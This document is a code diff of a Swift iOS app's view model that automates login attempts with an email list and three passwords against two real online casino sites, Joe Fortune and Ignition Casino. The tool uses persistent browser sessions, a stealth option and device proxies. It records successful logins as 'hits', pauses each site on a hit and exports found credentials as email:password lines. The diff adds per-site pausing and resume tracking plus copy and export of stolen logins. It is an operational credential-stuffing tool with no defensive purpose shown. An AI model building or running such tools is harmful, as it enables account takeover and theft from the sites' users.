@@ -12,11 +12,14 @@ class DualFindViewModel {
     var emailInputText: String = ""
 
     var isRunning: Bool = false
-    var isPaused: Bool = false
+    var isJoePaused: Bool = false
+    var isIgnPaused: Bool = false
     var isStopping: Bool = false
 
-    var currentEmailIndex: Int = 0
-    var currentPasswordIndex: Int = 0
+    var joeEmailIndex: Int = 0
+    var joePasswordIndex: Int = 0
+    var ignEmailIndex: Int = 0
+    var ignPasswordIndex: Int = 0
     var totalEmails: Int = 0
     var completedTests: Int = 0
 
@@ -28,6 +31,7 @@ class DualFindViewModel {
     var showLoginFound: Bool = false
     var latestHit: DualFindHit?
     var hasResumePoint: Bool = false
+    var copiedHitId: String?
 
     var appearanceMode: AppAppearanceMode = .dark
     var stealthEnabled: Bool = true
@@ -38,7 +42,7 @@ class DualFindViewModel {
 
     private var resumePoint: DualFindResumePoint?
     private var runTask: Task<Void, Never>?
-    private let persistKey = "dual_find_resume_v1"
+    private let persistKey = "dual_find_resume_v2"
 
     private var joePersistentSessions: [LoginSiteWebSession] = []
     private var ignPersistentSessions: [LoginSiteWebSession] = []
@@ -57,10 +61,16 @@ class DualFindViewModel {
     private let blacklistService = BlacklistService.shared
     private let calibrationService = LoginCalibrationService.shared
 
+    var isPaused: Bool {
+        isJoePaused && isIgnPaused
+    }
+
     var progressText: String {
         guard totalEmails > 0 else { return "Ready" }
         let totalCombos = totalEmails * 3 * 2
-        return "\(completedTests)/\(totalCombos) tested — Password \(currentPasswordIndex + 1)/3"
+        let jPw = joePasswordIndex + 1
+        let iPw = ignPasswordIndex + 1
+        return "\(completedTests)/\(totalCombos) — JOE pw\(jPw) · IGN pw\(iPw)"
     }
 
     var progressFraction: Double {
@@ -76,6 +86,19 @@ class DualFindViewModel {
 
     var canStart: Bool {
         parsedEmailCount > 0 && passwords.filter({ !$0.trimmingCharacters(in: .whitespaces).isEmpty }).count == 3
+    }
+
+    var runStatusLabel: String {
+        if isJoePaused && isIgnPaused { return "PAUSED" }
+        if isJoePaused { return "JOE PAUSED" }
+        if isIgnPaused { return "IGN PAUSED" }
+        return "RUNNING"
+    }
+
+    var runStatusColor: Color {
+        if isJoePaused && isIgnPaused { return .yellow }
+        if isJoePaused || isIgnPaused { return .orange }
+        return .green
     }
 
     init() {
@@ -107,14 +130,17 @@ class DualFindViewModel {
 
         emails = parsed
         totalEmails = parsed.count
-        currentEmailIndex = 0
-        currentPasswordIndex = 0
+        joeEmailIndex = 0
+        joePasswordIndex = 0
+        ignEmailIndex = 0
+        ignPasswordIndex = 0
         completedTests = 0
         disabledEmails.removeAll()
         hits.removeAll()
         logs.removeAll()
         sessions.removeAll()
-        isPaused = false
+        isJoePaused = false
+        isIgnPaused = false
         isStopping = false
 
         buildSessionInfoDisplay()
@@ -140,15 +166,18 @@ class DualFindViewModel {
 
         emails = rp.emails
         totalEmails = rp.emails.count
-        currentEmailIndex = rp.emailIndex
-        currentPasswordIndex = rp.passwordIndex
+        joeEmailIndex = rp.joeEmailIndex
+        joePasswordIndex = rp.joePasswordIndex
+        ignEmailIndex = rp.ignEmailIndex
+        ignPasswordIndex = rp.ignPasswordIndex
         disabledEmails = Set(rp.disabledEmails)
         hits = rp.foundLogins
         sessionCount = DualFindSessionCount(rawValue: rp.sessionCount) ?? .six
         completedTests = 0
         logs.removeAll()
         sessions.removeAll()
-        isPaused = false
+        isJoePaused = false
+        isIgnPaused = false
         isStopping = false
 
         if rp.passwords.count == 3 {
@@ -158,7 +187,7 @@ class DualFindViewModel {
         buildSessionInfoDisplay()
 
         logSettingsSummary()
-        log("Resuming Dual Find from Email \(currentEmailIndex + 1)/\(totalEmails), Password \(currentPasswordIndex + 1)/3")
+        log("Resuming Dual Find — JOE from Email \(joeEmailIndex + 1)/\(totalEmails) PW \(joePasswordIndex + 1)/3, IGN from Email \(ignEmailIndex + 1)/\(totalEmails) PW \(ignPasswordIndex + 1)/3")
 
         isRunning = true
         DeviceProxyService.shared.notifyBatchStart()
@@ -169,19 +198,22 @@ class DualFindViewModel {
         }
     }
 
-    func pauseRun() {
-        isPaused = true
+    func pauseAll() {
+        isJoePaused = true
+        isIgnPaused = true
         log("Paused — all sessions frozen", level: .warning)
     }
 
-    func resumeFromPause() {
-        isPaused = false
-        log("Resumed")
+    func resumeAll() {
+        isJoePaused = false
+        isIgnPaused = false
+        log("Resumed all platforms")
     }
 
     func stopRun() {
         isStopping = true
-        isPaused = false
+        isJoePaused = false
+        isIgnPaused = false
         log("Stopping — finishing current tests...", level: .warning)
     }
 
@@ -191,7 +223,22 @@ class DualFindViewModel {
         UserDefaults.standard.removeObject(forKey: persistKey)
     }
 
-    // MARK: - Core Run Loop (Persistent Sessions, Independent Platform Loops)
+    func copyHit(_ hit: DualFindHit) {
+        UIPasteboard.general.string = hit.copyText
+        copiedHitId = hit.id
+        Task {
+            try? await Task.sleep(for: .seconds(1.5))
+            if copiedHitId == hit.id {
+                copiedHitId = nil
+            }
+        }
+    }
+
+    func exportAllHits() -> String {
+        hits.map { "\($0.email):\($0.password) [\($0.platform)]" }.joined(separator: "\n")
+    }
+
+    // MARK: - Core Run Loop
 
     private func executeRun(emails: [String], passwords: [String]) async {
         await withTaskGroup(of: Void.self) { group in
@@ -212,6 +259,9 @@ class DualFindViewModel {
         let perSite = sessionCount.perSite
         let siteLabel = site == .joefortune ? "JOE" : "IGN"
         let platformName = site == .joefortune ? "Joe Fortune" : "Ignition Casino"
+        let isJoe = site == .joefortune
+
+        let startPwIdx = isJoe ? joePasswordIndex : ignPasswordIndex
 
         log("[\(siteLabel)] Starting platform loop: \(perSite) persistent sessions")
 
@@ -237,7 +287,7 @@ class DualFindViewModel {
             updateSession(id: "\(platformName)_\(i)", email: "", status: "Ready", active: false)
         }
 
-        if site == .joefortune {
+        if isJoe {
             joePersistentSessions = webSessions
             joeCalibrations = calibrations
         } else {
@@ -245,17 +295,23 @@ class DualFindViewModel {
             ignCalibrations = calibrations
         }
 
-        for pwIdx in currentPasswordIndex..<3 {
+        for pwIdx in startPwIdx..<3 {
             guard !isStopping else { break }
             let password = passwords[pwIdx]
             log("[\(siteLabel)] === Password Round \(pwIdx + 1)/3 ===")
+
+            if isJoe {
+                joePasswordIndex = pwIdx
+            } else {
+                ignPasswordIndex = pwIdx
+            }
 
             for i in 0..<webSessions.count {
                 guard !isStopping else { break }
                 let label = "\(siteLabel)-\(i + 1)"
                 let session = webSessions[i]
 
-                if pwIdx > 0 {
+                if pwIdx > startPwIdx || (pwIdx == startPwIdx && i > 0) {
                     await session.clearPasswordFieldOnly()
                     try? await Task.sleep(for: .milliseconds(200))
                     log("[\(label)] Cleared password field for pw \(pwIdx + 1)")
@@ -275,13 +331,13 @@ class DualFindViewModel {
             }
 
             let emailStartIdx: Int
-            if pwIdx == resumePoint?.passwordIndex, let rpIdx = resumePoint?.emailIndex {
-                emailStartIdx = rpIdx
+            if pwIdx == startPwIdx {
+                emailStartIdx = isJoe ? joeEmailIndex : ignEmailIndex
             } else {
                 emailStartIdx = 0
             }
 
-            if site == .joefortune {
+            if isJoe {
                 joeNextEmailIdx = emailStartIdx
             } else {
                 ignNextEmailIdx = emailStartIdx
@@ -303,10 +359,6 @@ class DualFindViewModel {
                 await group.waitForAll()
             }
 
-            if site == .joefortune {
-                currentPasswordIndex = pwIdx
-            }
-
             log("[\(siteLabel)] Password \(pwIdx + 1)/3 complete", level: .success)
         }
 
@@ -320,19 +372,27 @@ class DualFindViewModel {
         let platformName = site == .joefortune ? "Joe Fortune" : "Ignition Casino"
         let label = "\(siteLabel)-\(sessionIndex + 1)"
         let sessionInfoId = "\(platformName)_\(sessionIndex)"
+        let isJoe = site == .joefortune
 
         while true {
             guard !isStopping else { break }
 
-            while isPaused && !isStopping {
-                try? await Task.sleep(for: .milliseconds(500))
+            let sitePaused = isJoe ? isJoePaused : isIgnPaused
+            if sitePaused {
+                while (isJoe ? isJoePaused : isIgnPaused) && !isStopping {
+                    try? await Task.sleep(for: .milliseconds(500))
+                }
             }
             guard !isStopping else { break }
 
             guard let emailIdx = grabNextEmail(for: site) else { break }
             let email = emails[emailIdx]
 
-            currentEmailIndex = max(currentEmailIndex, emailIdx)
+            if isJoe {
+                joeEmailIndex = max(joeEmailIndex, emailIdx)
+            } else {
+                ignEmailIndex = max(ignEmailIndex, emailIdx)
+            }
 
             if disabledEmails.contains(email.lowercased()) {
                 log("[\(label)] Skipping disabled: \(email)")
@@ -401,8 +461,14 @@ class DualFindViewModel {
                 updateSession(id: sessionInfoId, email: email, status: "HIT!", active: false)
 
                 saveResumePoint()
-                isPaused = true
-                while isPaused && !isStopping {
+
+                if isJoe {
+                    isJoePaused = true
+                } else {
+                    isIgnPaused = true
+                }
+
+                while (isJoe ? isJoePaused : isIgnPaused) && !isStopping {
                     try? await Task.sleep(for: .milliseconds(500))
                 }
                 if isStopping { break }
@@ -458,8 +524,14 @@ class DualFindViewModel {
                     updateSession(id: sessionInfoId, email: email, status: "HIT!", active: false)
 
                     saveResumePoint()
-                    isPaused = true
-                    while isPaused && !isStopping {
+
+                    if isJoe {
+                        isJoePaused = true
+                    } else {
+                        isIgnPaused = true
+                    }
+
+                    while (isJoe ? isJoePaused : isIgnPaused) && !isStopping {
                         try? await Task.sleep(for: .milliseconds(500))
                     }
                     if isStopping { break }
@@ -751,7 +823,8 @@ class DualFindViewModel {
 
     private func finalizeRun() {
         isRunning = false
-        isPaused = false
+        isJoePaused = false
+        isIgnPaused = false
         let stoppedEarly = isStopping
         isStopping = false
         backgroundService.endExtendedBackgroundExecution()
@@ -773,8 +846,10 @@ class DualFindViewModel {
 
     private func saveResumePoint() {
         let rp = DualFindResumePoint(
-            emailIndex: currentEmailIndex,
-            passwordIndex: currentPasswordIndex,
+            joeEmailIndex: joeEmailIndex,
+            joePasswordIndex: joePasswordIndex,
+            ignEmailIndex: ignEmailIndex,
+            ignPasswordIndex: ignPasswordIndex,
             emails: emails,
             passwords: passwords,
             sessionCount: sessionCount.rawValue,
